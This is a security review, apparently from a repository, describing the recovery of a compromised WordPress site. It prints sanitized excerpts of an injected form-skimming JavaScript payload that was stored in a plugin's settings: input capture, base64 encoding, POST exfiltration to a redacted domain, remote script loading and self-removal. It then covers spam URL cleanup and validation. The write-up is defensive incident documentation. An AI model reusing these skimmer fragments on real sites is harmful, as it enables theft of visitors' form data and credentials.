# Security Review

## Objective

As part of the recovery process, a comprehensive security review was performed before deploying the recovered website to production. The objective was to identify malicious modifications, validate the integrity of the recovered website, and ensure that no indicators of compromise remained.

---

## Security Findings

### 1. Malicious JavaScript Injection

A malicious JavaScript payload was discovered within the configuration of the **Head, Footer and Post Injections** plugin.

The payload demonstrated several suspicious behaviors commonly associated with information-stealing malware:

* Monitoring user input across HTML form fields.
* Encoding captured values before transmission.
* Sending captured information to an external endpoint.
* Loading additional remote JavaScript.
* Attempting to remove its own script elements after execution.

---

### Technical Indicators

#### Form Input Monitoring

```javascript
document.addEventListener("input", function(event) {
    if ("INPUT" === event.target.tagName && "button" !== event.target.type) {
        sendPostRequest(
            event.target.name || event.target.id,
            event.target.value
        );
    }
});
```

#### External Data Transmission

```javascript
fetch("https://[redacted-malicious-domain]/[redacted-endpoint].php", {
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    body: payload.toString()
});
```

#### Encoded Payload

```javascript
const uid = generateRandomString(10);

payload.append("uid", uid);
payload.append("i_name", fieldName);
payload.append("b", btoa(fieldValue));
```

#### Remote Script Loading

```html
<script src="https://[redacted-malicious-domain]/[redacted-script].js"></script>
```

#### Self-Removal Behaviour

```javascript
var injectedScript = document.getElementById("injected-script-id");

if (injectedScript) {
    injectedScript.parentNode.removeChild(injectedScript);
}
```

These excerpts have been sanitized by removing live malicious domains while preserving the technical behaviour observed during the investigation.

---

### 2. Spam URL Injection

During the final quality assurance phase, the rendered HTML source of the recovered website was manually inspected.

This review identified two remaining pages containing hidden spam URL injections that had survived the initial recovery.

The injected URLs were removed before production deployment.

---

## Root Cause

The malicious JavaScript was stored within the configuration of the **Head, Footer and Post Injections** plugin rather than inside WordPress core files or the active theme.

The additional spam URL injections were discovered only after manually reviewing the rendered HTML source during the final validation phase.

This reinforced the importance of validating:

* Plugin configuration
* Rendered HTML source
* Generated page output

rather than relying solely on file-level inspection.

---

## Investigation Process

The following security review activities were completed:

* Reviewed WordPress plugin configuration.
* Investigated suspicious JavaScript.
* Inspected rendered HTML source.
* Reviewed active plugins.
* Verified restored theme files.
* Validated recovered media.
* Inspected generated page output.
* Executed broken link verification.
* Performed final production validation.

---

## Remediation Actions

The following corrective actions were completed:

* Removed malicious JavaScript injection.
* Removed remaining spam URL injections.
* Reviewed plugin configuration.
* Validated WordPress installation.
* Confirmed restored media integrity.
* Verified page rendering.
* Completed staging validation.
* Performed production verification after deployment.

---

## Validation Results

Final verification included both manual inspection and automated validation.

Validation confirmed:

* Malicious JavaScript injection removed.
* Spam URL injections removed.
* Rendered HTML source manually inspected.
* Internal navigation verified.
* Media rendering verified.
* WPBakery content rendering validated.
* No remaining broken links detected.
* Website successfully validated before production deployment.

### Broken Link Validation

* Pages scanned: **29**
* Broken links found: **0**

### Final Status

The recovered website passed infrastructure, security, content, media, and link validation prior to production deployment.

---

## Security Outcome

The recovered website successfully passed the final security review.

No evidence of the identified JavaScript payload or spam URL injections remained following remediation.

The website was deployed to production only after completing functional, security, and content validation.

---

## Lessons Learned

This recovery reinforced several important practices:

* Plugin configuration should always be included in security reviews.
* Rendered HTML source should be inspected in addition to PHP source files.
* Final validation should include both automated and manual verification.
* Staging environments significantly reduce deployment risk.
* Production deployment should occur only after confirming that all indicators of compromise have been eliminated.

---

## Supporting Evidence

The repository includes screenshots documenting:

* Discovery of the malicious JavaScript injection.
* Removal of spam URL injections.
* HTML source inspection.
* WPBakery content recovery.
* Final broken link verification.
* Restored production website.

---

## Disclaimer

This repository documents the engineering methodology followed during the recovery of a production WordPress website.

Client source code, proprietary assets, credentials, database backups, and live malicious infrastructure have intentionally been excluded.

Code excerpts included in this document have been sanitized for educational and documentation purposes.
